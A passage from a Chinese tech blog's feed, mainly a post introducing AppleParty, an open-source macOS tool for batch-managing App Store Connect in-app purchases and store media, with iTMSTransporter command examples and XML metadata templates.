href="https://zhuanlan.zhihu.com/p/31728097">App Store大陆开发者收款总结 - 知乎</a></li><li><a href="https://help.apple.com/app-store-connect/?lang=zh-cn#/devfa880063b">财务报告字段 - App Store Connect 帮助</a></li><li><a href="https://help.apple.com/app-store-connect/#/dev3d7556467">最低付款门槛 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/system-status/">System Status - Apple Developer</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7097126999827628063&quot;&gt;苹果 AppStore 财年和账单那些趣事 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本文带你了解苹果 AppStore 的财年和账单周期，关于 AppStore 开发者账单和收入，相信很多开发者不一定有接触，或者接触时还是有很多疑问没有时间来学习。另外，还会有一些财年的诡计问题，比如为什么阿里巴巴财年是从4月1号到次年的3月31号呢？苹果财年为什么这么奇怪，本文一一为你解答~&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="苹果财年" scheme="https://ihtcboy.com/tags/%E8%8B%B9%E6%9E%9C%E8%B4%A2%E5%B9%B4/"/>
    
    <category term="App Store 账单" scheme="https://ihtcboy.com/tags/App-Store-%E8%B4%A6%E5%8D%95/"/>
    
  </entry>
  
  <entry>
    <title>开源一款苹果 macOS 工具 - AppleParty（苹果派）</title>
    <link href="https://ihtcboy.com/2022/03/31/2022-03-31_%E5%BC%80%E6%BA%90%E8%8B%B9%E6%9E%9C%E6%8F%90%E6%95%88macOS%E5%B7%A5%E5%85%B7AppleParty%E8%8B%B9%E6%9E%9C%E6%B4%BE/"/>
    <id>https://ihtcboy.com/2022/03/31/2022-03-31_%E5%BC%80%E6%BA%90%E8%8B%B9%E6%9E%9C%E6%8F%90%E6%95%88macOS%E5%B7%A5%E5%85%B7AppleParty%E8%8B%B9%E6%9E%9C%E6%B4%BE/</id>
    <published>2022-03-31T01:26:10.000Z</published>
    <updated>2022-12-31T15:23:14.254Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7081069026515877919">开源一款苹果 macOS 工具 - AppleParty（苹果派） - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><blockquote><p>AppleParty 是 37手游 iOS 团队研发，实现快速操作 App Store Connect 后台的自动化 macOS 工具。本文会介绍工具诞生的背景、使用教程和代码实现的简介，希望通过开源与大家分享成果，让更多人一起参与改进和完善，最后一起提高效率和拓展探索方向。</p></blockquote><span id="more"></span><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>大家好，很高兴告诉大家一件重要的事情，我们发起了一个开源项目 —— <a href="https://github.com/37iOS/AppleParty">AppleParty（苹果派）</a>（苹果派）。这是我们团队在上一个 <a href="https://juejin.cn/post/7051512478630412301">开源的 App Store</a> 后又一个尝试。AppleParty 这个项目是我们 37手游 iOS 团队内部孵化的一个产品，希望这个项目能作为一个引子，通过开源与大家分享成果，一起提高效率和拓展大家对未来的探索方向。</p><h2 id="二、项目背景"><a href="#二、项目背景" class="headerlink" title="二、项目背景"></a>二、项目背景</h2><p>目前，iOS/macOS App 上架 App Store，与苹果打交道的唯一方式，就是登陆苹果 App Store Connect 后台（<a href="https://appstoreconnect.apple.com/">https://appstoreconnect.apple.com</a>，通过苹果后台进行 App 所有的信息和素材等送审准备工作。但是，目前苹果后台的自动化水平还处于零基础，很多重复的操作和功能，都没有提供批量处理方案，比如：</p><ul><li>商店截图和预览视频的上传</li><li>应用内购商品的创建和更新</li><li>App 本地化的元数据信息配置</li><li>开发者证书创建和管理</li><li>…</li></ul><p>App 分析的指标：</p><ul><li>展示次数</li><li>产品页面查看次数</li><li>首次下载次数</li><li>净预订量</li><li>平台版本（iOS14.5、iOS15…)</li><li>页面类型（产品页面、商店表单、App内活动…）</li><li>用户来源（网页引荐来源、App 引荐来源、AppStore 浏览、AppStore 搜索、活动通知…）</li><li>…</li></ul><p>以上的 App 分析数据，每次只能下载一个指标的数据，每个 App 有十几个指标，操作这些重复的配置往往占用了运营同学非常长的时间，效率低且重复无聊的工作，导致我们长期无法做更多的时间开启和享受创造性。</p><p>基于以上种种痛点，我们从多个技术手段，打造了 Apple Party（苹果派对）工具! 通过尽可能快速实现操作的自动化流程，从而大大提高苹果后台的操作效率！</p><blockquote><p>注：目前苹果有提供 App Store Connect API 方式，但是目前迭代的功能，还不能满足所有的需求，下文会展开说明。</p></blockquote><h3 id="2-1-Apple-Party（苹果派）名字起源"><a href="#2-1-Apple-Party（苹果派）名字起源" class="headerlink" title="2.1 Apple Party（苹果派）名字起源"></a>2.1 Apple Party（苹果派）名字起源</h3><p><strong>Apple Party（苹果派）</strong></p><p>我们倡导工作之余，丰富多彩的生活要领，健身、旅游、聚会、培养艺术兴趣等等。</p><ul><li>Party：派对 即 “宴会，聚会” 的意思，大家聚在一起庆祝和休闲的一种活动。</li></ul><p>所以，Apple Party（苹果派对），简称：<strong>苹果派</strong>，就是希望大家在使用苹果的服务时，像似参加一场苹果派对，尽情欢乐，欢聚宴会~</p><p>我们希望，大家在 AppleOS 生态下开发时，可以提高效率，专注于核心内容，然后愉快派对！</p><h2 id="三、使用说明"><a href="#三、使用说明" class="headerlink" title="三、使用说明"></a>三、使用说明</h2><h3 id="3-1-注意事件"><a href="#3-1-注意事件" class="headerlink" title="3.1 注意事件"></a>3.1 注意事件</h3><p><strong>目前实现的功能</strong></p><ul><li>内购买项目管理（批量创建和更新）；</li><li>批量商店图和预览视频上传和更新；</li><li>数据报表批量下载(后续开源)；</li><li>邮件发送工具；</li><li>二维码扫描和生成工具；</li></ul><blockquote><p>注：内购买项目和商店素材上传，暂时只支持 iOS app，未来会考虑支持 macOS app、tvOS app。</p></blockquote><p><strong>环境依赖</strong></p><ul><li>支持 macOS 10.13 和以上系统</li><li>依赖 <a href="https://apps.apple.com/cn/app/transporter/id1450874784">Transporter.app</a></li><li>依赖 Xcode（Transporter.app 依赖）</li></ul><h3 id="3-1-安装包下载"><a href="#3-1-安装包下载" class="headerlink" title="3.1 安装包下载"></a>3.1 安装包下载</h3><p>目前我们在 GitHub 开源 <a href="https://github.com/37iOS/AppleParty">37iOS/AppleParty</a>，所以提供GitHub 安装包：</p><ul><li><a href="https://github.com/37iOS/AppleParty/releases">AppleParty 下载</a></li></ul><p><strong>update 更新</strong></p><p>目前已经使用 Sparkle 来实现版本更新，默认启动就会自动检查更新，也可以通过菜单栏进行手动检查更新。</p><h3 id="3-2-使用介绍"><a href="#3-2-使用介绍" class="headerlink" title="3.2 使用介绍"></a>3.2 使用介绍</h3><p>因为账号记录是存放在 Keychain 里，所以首次打开时，会提示需要访问<strong>钥匙串</strong>：<br><img src="https://ihtcboy.com/images/2022-AppleParty-01.png" alt="AppleParty-01"></p><blockquote><p>如果点击“拒绝”，则不会保存账号和密码信息。</p></blockquote><p>然后，会显示主界面：<br><img src="https://ihtcboy.com/images/2022-AppleParty-02.png" alt="AppleParty-02"></p><p>默认情况下弹出登陆界面，也可以点击取消登陆（快捷键<code>esc</code>）：<br><img src="https://ihtcboy.com/images/2022-AppleParty-03.png" alt="AppleParty-03"></p><p>现在默认登陆都需要双重认证：<br><img src="https://ihtcboy.com/images/2022-AppleParty-04.png" alt="AppleParty-04"></p><p>如果需要使用短信验证码，可以点击“发送短信验证码”，如果希望通过语言验证码，可以勾选“拨打语言来电”切换：<br><img src="https://ihtcboy.com/images/2022-AppleParty-05.png" alt="AppleParty-05"></p><h4 id="3-2-1-批量上传内购买项目和商店素材"><a href="#3-2-1-批量上传内购买项目和商店素材" class="headerlink" title="3.2.1 批量上传内购买项目和商店素材"></a>3.2.1 批量上传内购买项目和商店素材</h4><p>点击“我的 App”，显示帐号所有的App，可以操作内购买项目管理和商店素材管理。<br><img src="https://ihtcboy.com/images/2022-AppleParty-06.png" alt="AppleParty-06"></p><p>点击内购管理，显示当前已有的内购品项列表:<br><img src="https://ihtcboy.com/images/2022-AppleParty-07.png" alt="AppleParty-07"></p><ul><li>刷新：刷新当前App的内购品项列表（刚刚上传的品项不会马上生效，所以可以手动刷新）</li><li>导入表格：通过固定表格的形式，批量创建内购品项</li><li>导出表格：导出所有品项的信息 Excel 表</li><li>导出品项 ID：导出品项productID和内购品项id的对应表</li><li>下载表格示例：批量创建内购品项的示例 Excel 表格</li></ul><p>点击 “导入表格”，可选择excel表进行导入，然后会显示导入的品项明细表。<br><img src="https://ihtcboy.com/images/2022-AppleParty-08.png" alt="AppleParty-08"></p><blockquote><p>如上图所示，列表1和2是自定义的送审截图，所以需要点击右下角的“上传截图”选定。</p></blockquote><p>“提交”后，会显示下面的界面，如未设置专用密码，首次需要设置，或者点击右下角“设置特殊密码”重新设置。<br><img src="https://ihtcboy.com/images/2022-AppleParty-09.png" alt="AppleParty-09"></p><blockquote><p>专用密码的生成参考文档：<a href="https://support.apple.com/zh-cn/HT204397">使用 App 专用密码 - Apple 支持 (中国)</a></p></blockquote><p>上传失败时，查看 ERROR 内容就是错误内容：<br><img src="https://ihtcboy.com/images/2022-AppleParty-10.png" alt="AppleParty-10"></p><p><strong>批量素材上传</strong></p><p>点击“素材一键导入”一键上传，素材可以分别在不同尺寸下显示。</p><p><img src="https://ihtcboy.com/images/2022-AppleParty-11.png" alt="AppleParty-11"></p><p>对应的尺寸，上传视频和截图后，填写排序的位置和视频海报帧：<br><img src="https://ihtcboy.com/images/2022-AppleParty-12.png" alt="AppleParty-12"></p><blockquote><p>可点击右上角 <code>？</code>按钮查看帮助文档。</p></blockquote><h4 id="3-2-2-其它扩展功能"><a href="#3-2-2-其它扩展功能" class="headerlink" title="3.2.2 其它扩展功能"></a>3.2.2 其它扩展功能</h4><p>邮箱功能，一方面是可以设置快速邮件发送，另一方面是工具效率自动邮箱的通知需求。<br><img src="https://ihtcboy.com/images/2022-AppleParty-13.png" alt="AppleParty-13"></p><p>二维码功能也是一个工作中的小痛点。<br><img src="https://ihtcboy.com/images/2022-AppleParty-14.png" alt="AppleParty-14"></p><h2 id="四、代码实现简解"><a href="#四、代码实现简解" class="headerlink" title="四、代码实现简解"></a>四、代码实现简解</h2><h3 id="4-1-上传内购买项目和商店素材"><a href="#4-1-上传内购买项目和商店素材" class="headerlink" title="4.1 上传内购买项目和商店素材"></a>4.1 上传内购买项目和商店素材</h3><p>使用的是苹果提供的 Transporter 工具链，提供了上会的命令，有 3 个工具：</p><ul><li>Xcode.app</li><li>Application Loader.app</li><li>Transporter.app</li></ul><p>其中，Application Loader 已经弃用了，可以忽视。<code>Transporter</code> 命令所有的目录：</p><p>Xcode.app:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/Applications/</span>Xcode.app<span class="regexp">/Contents/</span>SharedFrameworks<span class="regexp">/ContentDeliveryServices.framework/</span>Versions<span class="regexp">/A/i</span>tms<span class="regexp">/bin/i</span>TMSTransporter</span><br></pre></td></tr></table></figure><p>Transporter.app:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/Applications/</span>Transporter.app<span class="regexp">/Contents/i</span>tms<span class="regexp">/bin/i</span>TMSTransporter</span><br></pre></td></tr></table></figure><h4 id="4-1-1-Transporter-命令使用"><a href="#4-1-1-Transporter-命令使用" class="headerlink" title="4.1.1 Transporter 命令使用"></a>4.1.1 Transporter 命令使用</h4><p><strong>Lookup Metadata 模式</strong></p><p>获取 app 信息，获取到一个 xxx.itmsp 包，里面有关于 app 版本和内购品项等信息的 xml 格式文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m lookupMetadata -u [user] -p [password] -apple_id(-apple_ids) -destination [output_path]</span><br></pre></td></tr></table></figure><p>示例：</p><p>同时获取多个 app 信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m lookupMetadata -u xxx@37.com -p 专用密码 -apple_ids 10 xxxx,多个appid,xxx -destination /Users/37/Desktop/output</span><br></pre></td></tr></table></figure><p>获取单个 app 信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m lookupMetadata -u 账号邮箱 -p 专用密码 -apple_id 某个appid -destination /Users/37/Desktop/output</span><br></pre></td></tr></table></figure><p><strong>Provider 模式</strong></p><p>查询供应商，也就是开发者账号的名字和团队 id：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m provider -u [user] -p [password]</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m provider -u xxx@37.com -p 专用密码</span><br></pre></td></tr></table></figure><p>输出内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Provider listing:</span><br><span class="line">   - Long Name -         - Short Name -</span><br><span class="line">1  apple_dev             28PV6...4</span><br><span class="line">2  37iOSTeam              R7S9...R1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Verify 模式</strong><br>校验上传内容是否合法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m verify -u [user] -p [password] -f [itmsp_path] [-vp ]</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m verify -u xxx@<span class="number">37</span>.com -p 专用密码 -f <span class="regexp">/Users/</span><span class="number">37</span><span class="regexp">/Desktop/</span>IAP.itmsp</span><br></pre></td></tr></table></figure><p><strong>Upload 模式</strong><br>上传内容。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m upload -u <span class="selector-attr">[user]</span> -<span class="selector-tag">p</span> <span class="selector-attr">[password]</span> -f <span class="selector-attr">[itmsp_path]</span></span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iTMSTransporter -m upload -u xxx@<span class="number">37</span>.com -p 专用密码 -f <span class="regexp">/Users/</span><span class="number">37</span><span class="regexp">/Desktop/</span>IAP.itmsp</span><br></pre></td></tr></table></figure><p>一些重要参数说明：</p><ul><li><code>-itc_provider</code>: 检查和上传时建议加子账号的团队id，但测试发现不用也行，先不带，因为获取很麻烦</li><li><code>-errorLogs</code>: 存储错误日志的目录</li><li><code>-loghistory</code>: 记录成功上传的数据包</li><li><code>-outputFormat xml</code>:  以 XML 格式返回输出信息,</li><li><code>-throughput</code>: 显示成功上传数据包的总传输时间以及数据包大小和每秒字节数</li><li><code>-o</code>: 记录输出信息</li><li><code>-v</code>: 日志级别，默认 eXtreme，详细</li><li><code>-vp</code>: 在验证或上传数据包文件时显示进度信息</li><li><code>-Xmx4096m</code>: 指定 4 GB Java 虚拟机 (JVM) 堆栈内存</li></ul><blockquote><p>详细，可以参考：<a href="https://help.apple.com/itc/transporteruserguide/#/apdAa073cb45">指定选项和值 - Transporter</a></p></blockquote><p>详细也可以查看官方文档：</p><ul><li><a href="https://itunespartner.apple.com/tv/articles/transporter_getting-set-up">What is Transporter?</a></li><li><a href="https://help.apple.com/itc/transporteruserguide/">Transporter 用户指南 2.0</a></li><li><a href="https://help.apple.com/itc/transporter/#/">Transporter 帮助</a></li><li><a href="https://help.apple.com/asc/appsspec/">App 元数据规范 5.11</a></li></ul><h4 id="4-1-2-itmsp-数据包说明"><a href="#4-1-2-itmsp-数据包说明" class="headerlink" title="4.1.2 itmsp 数据包说明"></a>4.1.2 itmsp 数据包说明</h4><p>通过命令，可以了解到，我们需要组装一个 <code>.itmsp</code> 的文件夹，里面包含我们需要上传的内购买项目的信息，送审截图，或者商店图片和预览视频等。</p><p><strong>内购买项目的 xml 配置文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://apple.com/itunes/importer&quot;</span> <span class="attr">version</span>=<span class="string">&quot;software5.9&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">provider</span>&gt;</span>&#123;team_id&#125;<span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">software</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vendor_id</span>&gt;</span>&#123;SKU&#125;<span class="tag">&lt;/<span class="name">vendor_id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">software_metadata</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in_app_purchases</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">in_app_purchase</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 可以由字母、数字、下划线（_）和句点（.）构成，最多 255 个字符 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">product_id</span>&gt;</span>com.app.1usd<span class="tag">&lt;/<span class="name">product_id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">reference_name</span>&gt;</span>1ud（2~64 个字符）<span class="tag">&lt;/<span class="name">reference_name</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 消耗型项目consumable 非消耗型non-consumable 自动续期订阅auto-renewable 非续期订阅subscription --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">type</span>&gt;</span>consumable<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">products</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">product</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">cleared_for_sale</span>&gt;</span>true<span class="tag">&lt;/<span class="name">cleared_for_sale</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">wholesale_price_tier</span>&gt;</span>3<span class="tag">&lt;/<span class="name">wholesale_price_tier</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">product</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">products</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">locales</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">locale</span> <span class="attr">name</span>=<span class="string">&quot;en-US&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">title</span>&gt;</span>2~30个字符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">description</span>&gt;</span>至少10~45个字符<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">locale</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">locale</span> <span class="attr">name</span>=<span class="string">&quot;zh-Hans&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">title</span>&gt;</span>中文2~30个字符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">description</span>&gt;</span>至少10~45个字符<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">locale</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">locales</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">review_screenshot</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- Supported dimensions are: 1334x750, 750x1334, 1024x768, 1024x748, 768x1024, 768x1004, 2048x1536, 2048x1496, 1536x2048, 1536x2008, 2224x1668, 1668x2224, 960x640, 960x600, 640x960, 640x920, 2208x1242, 1242x2208, 2436x1125, 1125x2436, 312x390, 1136x640, 1136x600, 640x1136, 640x1096, 2732x2048, 2048x2732&quot; --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">size</span>&gt;</span>636132<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">file_name</span>&gt;</span>IMG_5180.PNG<span class="tag">&lt;/<span class="name">file_name</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksum</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="name">checksum</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">review_screenshot</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">review_notes</span>&gt;</span>Some notes for the reviewer.（2~4000字符）<span class="tag">&lt;/<span class="name">review_notes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">in_app_purchase</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in_app_purchases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">software_metadata</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">software</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>商店图片和预览视频的 xml 配置文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">version</span>=<span class="string">&quot;software5.10&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://apple.com/itunes/importer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">provider</span>&gt;</span>&#123;provider&#125;<span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">team_id</span>&gt;</span>&#123;provider&#125;<span class="tag">&lt;/<span class="name">team_id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">software</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vendor_id</span>&gt;</span>&#123;vendor_id&#125;<span class="tag">&lt;/<span class="name">vendor_id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">software_metadata</span> <span class="attr">app_platform</span>=<span class="string">&quot;&#123;app_platform&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">versions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span> <span class="attr">string</span>=<span class="string">&quot;&#123;app_version&#125;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">locales</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">locale</span> <span class="attr">name</span>=<span class="string">&quot;&#123;app_locale&#125;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">app_previews</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">app_preview</span> <span class="attr">display_target</span>=<span class="string">&quot;&#123;iOS-5.5-in&#125;&quot;</span> <span class="attr">position</span>=<span class="string">&quot;&#123;1&#125;&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">data_file</span> <span class="attr">role</span>=<span class="string">&quot;source&quot;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">size</span>&gt;</span>&#123;video_size&#125;<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">file_name</span>&gt;</span>&#123;video_name&#125;<span class="tag">&lt;/<span class="name">file_name</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">checksum</span>&gt;</span>&#123;video_md5&#125;<span class="tag">&lt;/<span class="name">checksum</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">data_file</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">preview_image_time</span> <span class="attr">format</span>=<span class="string">&quot;30/1:1/nonDrop&quot;</span>&gt;</span>&#123;00:00:05:00&#125;<span class="tag">&lt;/<span class="name">preview_image_time</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">app_preview</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">app_previews</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">software_screenshots</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">software_screenshot</span> <span class="attr">display_target</span>=<span class="string">&quot;&#123;iOS-5.5-in&#125;&quot;</span> <span class="attr">position</span>=<span class="string">&quot;&#123;1&#125;&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">size</span>&gt;</span>&#123;image_size&#125;<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">file_name</span>&gt;</span>&#123;image_name&#125;<span class="tag">&lt;/<span class="name">file_name</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">checksum</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span>&#123;image_md5&#125;<span class="tag">&lt;/<span class="name">checksum</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">software_screenshot</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">software_screenshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">locale</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">locales</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">versions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">software_metadata</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">software</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>上传 iap 包的 xml 配置文件</strong></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">package</span> <span class="attr">version</span>=<span class="string">&quot;software5.10&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://apple.com/itunes/importer&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">  